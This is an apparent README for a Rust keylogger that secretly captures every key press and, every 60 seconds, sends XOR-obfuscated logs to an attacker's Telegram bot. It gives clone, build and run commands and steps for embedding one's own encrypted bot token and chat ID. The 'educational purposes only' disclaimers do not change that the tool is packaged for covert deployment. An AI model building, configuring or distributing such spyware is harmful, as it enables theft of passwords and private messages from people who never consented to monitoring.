
Rust Keylogger with telegram exfiltration (Educational Purposes Only)

Disclaimer:
This tool is provided strictly for **educational**, **research**, or **authorized penetration testing** purposes. Unauthorized use against any system or individual is illegal and unethical.

Overview

This is a lightweight keylogger written in Rust that captures keyboard input on a local system and exfiltrates the logs to a Telegram chat at regular intervals using XOR-obfuscated credentials.

Features

- Captures all key presses using `device_query`
- Logs to a local file (`keystrokes.log`)
- Exfiltrates encrypted logs to Telegram every 60 seconds
- Uses XOR encryption for simple obfuscation of tokens and logs
- Multithreaded operation (key capture and exfiltration run concurrently)

---

Requirements

- Rust (recommended: latest stable)
- Linux OS with access to input devices (e.g., X11 or Wayland with access permissions)
- Telegram bot token and chat ID (manually XOR-encrypted)

Installation

Clone the repository:

   ```bash
   git clone  https://github.com/calebpentest/stealthvector.git
   cd stealthvector
````

Install dependencies:

   ```bash
   cargo build --release
   ```

Run the binary:

   ```bash
   ./target/release/keylogger
   ```

   > Note: You may need root permissions to access input devices.

---

How It Works

* **Keylogging Loop:** Polls the current key state every 50ms. If a key is newly pressed, it is logged.
* **Exfiltration Thread:** Every 60 seconds, the contents of `keystrokes.log` are XOR-encrypted, Base64-encoded, and sent to a Telegram bot via HTTP POST.
* **Obfuscation:** Telegram bot token and chat ID are stored XOR-encrypted in the binary.

---

How to Customize

Encrypt Your Own Bot Token and Chat ID

1. Update the `XOR_KEY` constant to your preferred key (default is `0xAA`).
2. Encrypt your bot token and chat ID using the `xor_encrypt()` function manually:

```rust
fn main() {
    let token = "your_bot_token_here";
    let chat_id = "your_chat_id_here";

    let enc_token = xor_encrypt(token);
    let enc_chat = xor_encrypt(chat_id);

    println!("Encrypted token: {:?}", enc_token);
    println!("Encrypted chat ID: {:?}", enc_chat);
}
```

3. Replace the `TELEGRAM_BOT_TOKEN_ENC` and `TELEGRAM_CHAT_ID_ENC` arrays with your own encrypted values.

---

Disclaimer

This software is not meant for malicious use. Always get **explicit written permission** before deploying tools like this. Violating privacy laws or computer misuse legislation can lead to criminal charges.

---
